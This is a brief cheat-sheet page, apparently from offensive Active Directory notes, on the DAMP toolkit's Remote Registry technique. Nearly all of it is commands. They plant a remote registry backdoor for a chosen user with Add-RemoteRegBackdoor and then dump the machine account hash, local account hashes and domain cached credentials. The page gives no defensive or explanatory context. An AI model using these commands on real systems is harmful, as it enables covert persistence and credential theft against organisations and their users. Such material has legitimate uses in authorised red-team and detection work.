# 5⃣ Remote Registry

### Using the DAMP toolkit

```
. ./Add-RemoteRegBackdoor
. ./RemoteHashRetrieval
```



### **Using DAMP with admin privs on the remote machine**

```
Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose
```



### **Retrieve the machine account hash from the local machine**

```
Get-RemoteMachineAccountHash -Computername <computername> -Verbose
```



### **Retrieve the local account hash from the local machine**

```
Get-RemoteLocalAccountHash -Computername <computername> -Verbose
```



### **Retrieve domain cached credentials from the local machine**

```
Get-RemoteCachedCredential -Computername <computername> -Verbose
```
